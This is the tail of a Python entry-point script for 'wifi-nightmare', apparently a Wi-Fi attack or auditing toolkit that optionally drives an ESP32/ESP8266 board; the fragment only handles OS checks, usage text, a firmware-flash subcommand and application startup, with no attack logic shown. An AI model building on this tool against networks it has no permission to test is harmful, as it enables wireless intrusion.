        print(f"{C_RED}[!] {APP_NAME} requires Linux. Current OS: {platform.system()}{C_RESET}")
        sys.exit(1)

    # Subcommand: flash-esp
    if len(sys.argv) >= 2 and sys.argv[1] == "flash-esp":
        from wifi_nightmare.flash_esp import main as flash_main
        flash_main(sys.argv[2:])
        return

    # Normal usage: wifi-nightmare <interface> [serial_port]
    setup_logger()

    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print(f"{C_YELLOW}Usage:{C_RESET} sudo wifi-nightmare <interface> [serial_port]")
        print(f"{C_YELLOW}Ex 1 (Standalone):{C_RESET} sudo wifi-nightmare wlan0")
        print(f"{C_YELLOW}Ex 2 (With ESP):{C_RESET} sudo wifi-nightmare wlan0 /dev/ttyUSB0")
        print(f"{C_YELLOW}ESP Flash:{C_RESET} sudo wifi-nightmare flash-esp <port> [--board esp32|esp8266]")
        sys.exit(1)

    from wifi_nightmare.dep_check import check_dependencies
    check_dependencies()

    port = sys.argv[2] if len(sys.argv) == 3 else None

    try:
        app = WifiGTR(sys.argv[1], port)
        app.start()
    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}[!] Bye.{C_RESET}")
        logger.info("User interrupted (KeyboardInterrupt)")
        try:
            app.cleanup()
        except Exception:
            pass
    except Exception as e:
        logger.exception(f"Unhandled exception: {e}")
        print(f"\n{C_RED}[!] Critical Error: {e}{C_RESET}")


if __name__ == "__main__":
    entry_point()